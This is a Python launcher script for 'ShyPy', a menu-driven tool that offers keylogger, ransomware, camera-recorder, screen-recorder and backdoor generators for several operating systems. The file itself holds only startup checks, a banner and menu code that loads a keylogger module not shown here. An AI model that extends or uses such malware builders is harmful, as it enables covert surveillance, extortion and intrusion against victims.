import sys
import time
import datetime
import importlib
from itertools import cycle
from utils.utils import Utils
from variables.variables import *

class ShyPy(Utils):
    def __init__(self) -> None:
        super().__init__()
        self.keylogger_module = importlib.import_module("modules.Keylogger_Generator")
        self.clear()

    def run(self) -> None:
        self.checkin()

    def module_exists(self, module_name) -> bool:
        try:
            __import__(module_name)
            return True
        
        except ImportError:
            return False

    def checkin(self) -> None:
        self.loader()
        try:
            self.clear()
            missing_libs = [module for module in LIBS if not self.module_exists(module)]

            if missing_libs:
                print(f"{COLOR["YELLOW"]}[!]{COLOR["RESET"]} The following libraries are missing: {', '.join(missing_libs)}")
                print(f"{COLOR["MAGENTA"]}[?]{COLOR["RESET"]} Please run {COLOR["YELLOW"]}'pip install -r requirements.txt'{COLOR["RESET"]} or {COLOR["YELLOW"]}'pip install {', '.join(missing_libs)}'{COLOR["RESET"]}")
                print(f"{COLOR["RED"]}[x]{COLOR["RESET"]} You need to install the required libraries to continue.")
                sys.exit(1)
            else:
                print(f"{COLOR["GREEN"]}[+]{COLOR["RESET"]} All required requirements are already installed.")
                time.sleep(2)
                self.main()

        except KeyboardInterrupt:
            self.clear()
            print(f'{COLOR["CYAN"]}Signed Out Of The Shypy{COLOR["RESET"]}')

    def loader(self) -> None:
        try:
            i = 0
            for c in cycle(["⢎⡰", "⢎⡡", "⢎⡑", "⢎⠱", "⠎⡱", "⢊⡱", "⢌⡱", "⢆⡱"]):
                sys.stdout.write(f'\rShypy >> {datetime.datetime.now().strftime("%H:%M:%S")} Checking Requirements..{COLOR["CYAN"]} {c} {COLOR["RESET"]}\t')
                sys.stdout.flush()
                time.sleep(0.07)
                i += 1

                if i == len(LIBS) * 5:
                    break
                else:
                    continue
        
        except (KeyboardInterrupt):
            self.clear()
            print(f'{COLOR["CYAN"]}Signed Out Of The Shypy{COLOR["RESET"]}')

    def main(self) -> None:
        try:
            self.clear()
            print(f"""{COLOR["CYAN"]}      
████████████████████████████████████████████████████████████████████████████╗
╚══██╔══════════════════════════════════════════════════════════════════════╝
   ██║  ██╗  ██╗  ███████╗     ██████╗  ██╗  ██╗  ██╗  ██╗  ██████═╗ ██╗  ██╗ 
   ██║  ██╚══██║  ██╔════╝    ██╔════╝  ██╚══██║  ██╚══██║  ██╔══██║ ██╚══██║
   ██║  ███████║  ███████╗    ╚██████═╗ ███████║  ╚██████║  ██████╔╝ ╚██████║
   ██║  ██╔══██║  ██╔════╝     ╚════██║ ██╔══██║   ╚═══██║  ██╔═══╝   ╚══╗██║
   ██║  ██║  ██║  ███████╗    ███████╔╝ ██║  ██║  ██████╔╝  ██║          ║██║
   ╚═╝  ╚═╝  ╚═╝  ╚══════╝    ╚══════╝  ╚═╝  ╚═╝  ╚═════╝   ╚═╝         ╔███║
   ████████████████████████████████████████████████████████████████████████╔╝
   ╚═══════════════════════════════════════════════════════════════════════╝\n""")
            
            ans = input('\t\t\t[Press "ENTER" To Continue] ').lower()

            if ans == "":
                self.program_menu()
                
            else:
                self.main()
        
        except KeyboardInterrupt:
            self.clear()
            print(f'{COLOR["CYAN"]}Signed Out Of The Shypy{COLOR["RESET"]}')

    def program_menu(self) -> None:
        try:
            self.clear()
            print(f"""{COLOR['CYAN']}
            ╔════════════════════════════╦══════════════════════╦════════════════════════╗
            ║* Version    :     0.1     *║ Welcome To The ShyPy ║*                      *║
            ╠════════════════════════════╩═════════╦════════════╩════════════════════════╣
            ║             Module Name              ║          Operating System           ║  
            ╠══════════════════════════════════════╬═════════════════════════════════════╣
            ║[1] Keylogger Generator               :    [ Windows | Linux | MacOS ]      ║
            ║[2] Ransomware Generator              :    [ Windows | Linux | MacOS ]      ║
            ║[3] Camera Recorder Generator         :    [ Windows | Linux | MacOS ]      ║
            ║[4] Screen Recorder Generator         :    [ Windows | Linux | MacOS ]      ║   
            ║[5] BackDoor Generator                :    [ Windows | Linux | MacOS ]      ║
            ╠══════════════════════════════════════╬═════════════════════════════════════╣
            ║ "use" <num>                          : Used To Select Modules.             ║
            ║ "exit"                               : To Log Out Of ShyPy.                ║  
            ╠═════════════════════════╦════════════╩═══════════════╦═════════════════════╣
            ║*                       *║ Developed by Atahan Poyraz ║*                   *║
            ╚═════════════════════════╩════════════════════════════╩═════════════════════╝\n""")
        
            ans = input(f"{COLOR["CYAN"]}ShyPy >> {COLOR["RESET"]}").lower()
            try:
                if ans.startswith("use"):                
                    if ans.split(" ")[1] in ("1", "keylogger generator"):
                        self.module = self.keylogger_module.KeyloggerGenerator()  
                        self.module.start()
                        
                    else:
                        print(f'{COLOR["YELLOW"]}[!]{COLOR["RESET"]} Invalid Module')
                        time.sleep(0.5)
                        self.program_menu()
            
                elif ans == "exit":
                    self.clear()
                    print(f'{COLOR["CYAN"]}Signed Out Of The Shypy{COLOR["RESET"]}')

                else:
                    print(f'{COLOR["YELLOW"]}[!]{COLOR["RESET"]} Invalid Option')
                    time.sleep(0.5)
                    self.program_menu()
                    
            except IndexError:
                print(f'{COLOR["YELLOW"]}[!]{COLOR["RESET"]} Invalid Module')
                time.sleep(0.5)
                self.program_menu()


        except KeyboardInterrupt:
            self.clear()
            print(f'{COLOR["CYAN"]}Signed Out Of The Shypy{COLOR["RESET"]}')

if __name__ == "__main__":
    s = ShyPy()
    s.run()